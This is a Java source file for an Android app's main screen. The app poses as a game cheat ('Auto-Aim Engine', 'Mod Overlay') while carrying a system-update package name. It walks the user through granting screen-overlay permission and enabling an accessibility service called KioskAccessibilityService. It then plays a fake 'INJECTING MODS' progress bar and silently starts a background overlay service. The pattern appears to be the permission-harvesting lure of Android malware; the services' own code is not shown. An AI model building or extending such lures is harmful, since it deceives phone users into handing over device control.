package com.system.updatex;

import android.animation.ObjectAnimator;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.View;
import android.view.animation.TranslateAnimation;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

    private Button overlayButton;
    private Button accessibilityButton;
    private Button activateButton;

    private ProgressBar progressBar;
    private TextView statusText;
    private TextView txtLogo;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean activating = false;
    private int progressStatus = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().setStatusBarColor(android.graphics.Color.rgb(8, 6, 16));
        getWindow().setNavigationBarColor(android.graphics.Color.rgb(8, 6, 16));

        setContentView(R.layout.activity_main);

        overlayButton = findViewById(R.id.overlayPermissionButton);
        accessibilityButton = findViewById(R.id.accessibilityPermissionButton);
        activateButton = findViewById(R.id.activateButton);
        progressBar = findViewById(R.id.progressBar);
        statusText = findViewById(R.id.statusText);
        txtLogo = findViewById(R.id.txtLogo);

        // --- PREMIUM ANIMATIONS ---
        // Pulsing Logo
        if (txtLogo != null) {
            ObjectAnimator scaleX = ObjectAnimator.ofFloat(txtLogo, "scaleX", 1f, 1.05f, 1f);
            ObjectAnimator scaleY = ObjectAnimator.ofFloat(txtLogo, "scaleY", 1f, 1.05f, 1f);
            scaleX.setDuration(2000);
            scaleY.setDuration(2000);
            scaleX.setRepeatCount(ObjectAnimator.INFINITE);
            scaleY.setRepeatCount(ObjectAnimator.INFINITE);
            scaleX.start();
            scaleY.start();
        }

        // Slide up animation for the activate button
        if (activateButton != null) {
            TranslateAnimation slideUp = new TranslateAnimation(0, 0, 200, 0);
            slideUp.setDuration(800);
            slideUp.setStartOffset(300);
            activateButton.startAnimation(slideUp);
        }
        // --------------------------

        overlayButton.setOnClickListener(v -> {
            Intent intent = new Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName())
            );
            startActivity(intent);
        });

        accessibilityButton.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });

        activateButton.setOnClickListener(v -> activateSession());
    }

    @Override
    protected void onResume() {
        super.onResume();
        refreshPermissions();
    }

    private boolean hasOverlayPermission() {
        return Settings.canDrawOverlays(this);
    }

    private boolean hasAccessibilityPermission() {
        String enabledServices = Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        );
        if (enabledServices == null) return false;
        String component = getPackageName() + "/" + KioskAccessibilityService.class.getName();
        return enabledServices.toLowerCase().contains(component.toLowerCase());
    }

    private void refreshPermissions() {
        overlayButton.setText(hasOverlayPermission() ? "Overlay Module: Loaded" : "1. Install Mod Overlay");
        accessibilityButton.setText(hasAccessibilityPermission() ? "Auto-Aim Engine: Active" : "2. Enable Auto-Aim Engine");
    }

    private void activateSession() {
        if (activating) return;

        if (!hasOverlayPermission()) {
            Toast.makeText(this, "Please install the Mod Overlay first.", Toast.LENGTH_SHORT).show();
            return;
        }

        if (!hasAccessibilityPermission()) {
            Toast.makeText(this, "Please enable the Auto-Aim Engine first.", Toast.LENGTH_SHORT).show();
            return;
        }

        activating = true;
        statusText.setText("INJECTING MODS...");
        progressBar.setVisibility(View.VISIBLE);
        progressBar.setProgress(0);
        activateButton.setEnabled(false);

        new Thread(() -> {
            for (progressStatus = 0; progressStatus <= 100; progressStatus += 5) {
                final int currentProgress = progressStatus;
                handler.post(() -> progressBar.setProgress(currentProgress));
                try {
                    Thread.sleep(150);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            handler.post(this::startAuthorizedSession);
        }).start();
    }

    private void startAuthorizedSession() {
        try {
            Intent serviceIntent = new Intent(this, OverlayService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            statusText.setText("HACK ACTIVATED");
            finish();
        } catch (Exception e) {
            activating = false;
            activateButton.setEnabled(true);
            progressBar.setVisibility(View.GONE);
            statusText.setText("INJECTION FAILED");
            Toast.makeText(this, e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
